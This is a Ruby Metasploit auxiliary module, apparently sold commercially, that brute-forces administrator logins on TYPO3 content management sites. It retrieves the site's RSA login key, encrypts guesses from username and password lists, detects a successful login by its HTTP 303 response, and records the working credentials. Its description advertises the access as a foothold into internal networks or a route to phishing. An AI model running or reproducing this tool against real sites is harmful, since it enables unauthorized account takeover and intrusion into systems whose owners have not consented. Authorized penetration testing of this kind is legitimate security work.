##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'
require 'openssl'

module Metasploit
  module Framework
    module LoginScanner
      class TYPO3 < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            key = OpenSSL::PKey::RSA.new

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'typo3/index.php'
            })

            res = cli.send_recv(req)

            cookie = res.get_cookies

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/')  + 'typo3/index.php',
              'vars_get' => {
                'ajaxID' => '/ajax/rsa/publickey',
                'skipSessionUpdate' => 1
              },
              'cookie' => cookie
            })

            res = cli.send_recv(req)

            nums = res.body.split(":")

            key.n = OpenSSL::BN.new(nums[0].to_i(16))
            key.e = OpenSSL::BN.new(nums[1].to_i(16))

            passw = Rex::Text.encode_base64(key.public_encrypt(credential.private))

            cookie = cookie + res.get_cookies

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'typo3/index.php',
              'method' => 'POST',
              'vars_post' => {
                'login_status' => 'login',
                'userident' => 'rsa:'+passw,
                'redirect_url' => '',
                'loginRefresh' => '',
                'interface' => 'backend',
                'username' => credential.public,
                'p_field' => '',
                'commandLI' => 'Submit'
              },
              'cookie' => cookie,
              'headers' => {
                'Referer' => 'http://'+host+'/typo3/index.php?'
              }
            })

            res = cli.send_recv(req)

            if res.code == 303
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof:res)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof:res)

            end

          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'TYPO3 Bruteforce',
        'Description'    => %q(
        This module bruteforces weak credentials on TYPO3 instances.

        TYPO3 is a popular open-source content management system written
        in PHP. Privileged access to a TYPO3 instance could result in a
        better foothold into the web server's internal network or provide
        for phishing opportunities.

        Categories: Open Source

        Price: 3

        Video: https://asciinema.org/a/29JA7XTe9AiXLGvisUixN5TA0

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 80,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::TYPO3.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
